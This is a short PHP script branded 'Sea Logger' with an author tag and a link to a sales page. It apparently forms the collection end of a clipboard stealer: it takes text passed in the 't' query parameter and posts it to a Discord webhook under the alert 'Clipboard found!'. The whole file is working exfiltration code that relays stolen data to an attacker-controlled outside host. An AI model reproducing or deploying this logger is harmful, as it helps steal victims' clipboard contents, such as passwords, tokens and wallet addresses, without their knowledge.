<?php

$wontent = htmlspecialchars($_GET['t']);

    //=======================================================================================================
// Create new webhook in your Discord channel settings and copy&paste URL
//=======================================================================================================

$webhookurl = "YourWebhook";

//=======================================================================================================
// Code by SEA#0666
//========================================================================================================

$timestamp = date("c", strtotime("now"));

$json_data = json_encode([
    // Message
    "content" => "@everyone Clipboard found!",
    
    // Username
    "username" => "Sea Logger",
    "avatar_url" => "https://cdn.discordapp.com/avatars/78587346420435628121/SEA#0666.png?size=80",

    // Text-to-speech
    "tts" => false,

    // Embeds Array
    "embeds" => [
        [
            // Embed Title
            "title" => "Clipboard found!",

            // Embed Type
            "type" => "rich",

            // Embed Description
            "description" => "```" . $wontent . "```",


            "timestamp" => $timestamp,

            // Embed left border color in HEX
            "color" => hexdec( "3366ff" ),

            // Footer
            "footer" => [
                "text" => "Coded by SEA#0666",
                "icon_url" => ""
            ],

            // Author
            "author" => [
                "name" => "Sea logger",
                "url" => "https://seaontop.sellix.io"
            ],

            // Additional Fields array
            "fields" => [
            ]
        ]
    ]

], JSON_UNESCAPED_SLASHES | JSON_UNESCAPED_UNICODE );
$ch = curl_init( $webhookurl );
curl_setopt( $ch, CURLOPT_HTTPHEADER, array('Content-type: application/json'));
curl_setopt( $ch, CURLOPT_POST, 1);
curl_setopt( $ch, CURLOPT_POSTFIELDS, $json_data);
curl_setopt( $ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt( $ch, CURLOPT_HEADER, 0);
curl_setopt( $ch, CURLOPT_RETURNTRANSFER, 1);

$response = curl_exec( $ch );
curl_close( $ch );
?>
